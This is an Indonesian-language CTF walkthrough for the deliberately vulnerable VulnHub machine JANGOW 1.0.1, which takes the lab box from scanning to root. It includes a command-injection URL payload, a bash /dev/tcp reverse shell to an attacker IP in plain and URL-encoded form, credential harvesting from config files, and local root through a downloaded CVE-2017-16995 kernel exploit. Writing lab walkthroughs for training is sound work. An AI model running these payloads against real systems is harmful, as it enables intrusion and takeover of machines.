# CTF JANGOW: 1.0.1 
Vulnerable Server: [JANGOW: 1.0.1](https://www.vulnhub.com/entry/jangow-101,754/)

## Requirement
- [Virtual Box](https://www.virtualbox.org/)
- [Kali linux](https://www.kali.org/get-kali/#kali-virtual-machines)
- [OPNsense](https://opnsense.org/) (optional)
- [JANGOW: 1.0.1](https://download.vulnhub.com/jangow/jangow-01-1.0.1.ova)

## Arsitektur Lab

## Penyelesaian
- Melakukan konfigurasi routing pada Kali Linux
```sh
ip route add 192.168.1.0/24 via 192.168.100.7
```

- Menemukan IP Address target
```sh
nmap -sn 192.168.1.0/24
```

- Melakukan Port Scanning pada target
```sh
nmap -sC -sV 192.168.1.103
```

- Sekarang kita coba buka halaman web lewat browser dengan URL `http://<IP_server>`

- Pada halaman diatas terdapat menu `Buscar` yang jika diklik akan diarahkan ke halaman kosong

- Jika diterjemahkan lewat google translate, `Buscar` adalah bahasa spanyol yang berarti `mencari`

- Jika kita ketikkan `ls` akan muncul list file dan folder yang ada di direktori aktif saat ini. Hal ini memungkinkan kita untuk melakukan serangan **OS command injection**

- Sekarang kita ketik `ls -la` untuk melihat seluruh file dan folder yang ada di direktori tersebut

- Tekan `Ctrl+U` untuk tampilan yang lebih rapi

- Ketik perintah berikut untuk melihat seluruh isi folder wordpress
```sh
ls -la wordpress
```

- Buka isi file `config.php` yang terdapat dalam folder wordpress
```sh
cat wordpress/config.php
```

- Pada source code diatas ditemukan username dan password. Sekarang kita coba username dan password tersebut untuk mengakses FTP server. Setelah dicoba ternyata tidak bisa digunakan untuk mengakses FTP server

- Sekarang kita coba ketik `pwd` untuk mengetahui posisi direktori

- Posisi direktori saat ini adalah di `/var/www/html/site` jadi kita bisa mengetahui file dan folder apa saja di direktori `/var/www/html` dengan perintah berikut
```sh
ls -la /var/www/html
```

- Kita berhasil menemukan file `.backup` di direktori `/var/www/html`. Sekarang kita buka isi file tersebut dengan perintah sebagai berikut
```sh
cat /var/www/html/.backup
```

- Sekarang kita coba username dan password tersebut untuk mengakses FTP server. Setelah dicoba, kita berhasil login ke FTP server

- Setelah kita telusuri tidak ada file menarik di FTP tersebut

- Sekarang kita bisa mencoba menjalankan **Reverse Shell** melalui **OS command injection**
- Ketik perintah berikut untuk mengetahui IP Kali Linux
```sh
ifconfig
```

- Setelah itu kita gunakan IP Kali Linux untuk menulis perintah Reverse Shell sebagai berikut
```sh
/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.5/443 0>&1'
```
- Encode terlebih dahulu perintah diatas dengan URL encoder https://www.urlencoder.org/
```sh
%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.5%2F443%200%3E%261%27
```

- Buat listener netcat pada port 443 sesuai reverse shell diatas
```sh
nc -lnvp 443
```

- Buka tab baru dan akses kembali URL `http://<IP_Server>/site/busque.php?buscar=`

- Copy perintah reverse shell yang sudah terencode diatas dan paste setelah tanda `=` pada URL ditas dan tekan enter untuk menjalankan

- Netcat berhasil terkoneksi

- Buat shell diatas menjadi interaktif terminal
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

- Switch ke user `jangow01`
```sh
su jangow01
abygurl69
```

- Kita berhasil menemukan user flag
```sh
cd /home/jangow01
cat user.txt
```

- Unduh program [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master) untuk menemukan jalur privilage escalation di linux
- Upload file linpeas.sh ke server dengan FTP
```sh
ftp 192.168.1.103
jangow01
abygurl69
cd /home/jangow01
put linpeas.sh
exit
```

- Pastikan file `linpeas.sh` berhasil terupload. Jika sudah, tambahkan akses execute dan jalankan program tersebut
```sh
chmod +x linpeas.sh
./linpeas.sh
```

- Terdapat informasi bahwa terdapat kerentan `CVE-2017-16995` pada server

- Download exploit CVE-2017-16995 di web https://www.exploit-db.com/exploits/45010

- Setelah berhasil didownload, upload file program `45010.c` ke server menggunakan FTP server
```sh
ftp 192.168.1.103
jangow01
abygurl69
cd /home/jangow01
put 45010.c
exit
```

- Setelah berhasil terupload ke server. Compile file program `45010.c` menggunakan `gcc`
```sh
gcc 45010.c -o cve-2017-16995
```

- Sekarang jalankan file `cve-2017-16995` dari hasil kompile diatas. Setelah dijalankan kita berhasil mendapatkan akses user `root`
```sh
./cve-2017-16995
```

- Kita berhasil menemukan root flag
```sh
cat /root/proof.txt
```

## Hasil IDS OPNsense


## Peringatan
Semua materi yang disajikan disini hanya digunakan sebagai media pembelajaran. Penulis tidak bertanggung jawab atas penyalahgunaan dari materi tersebut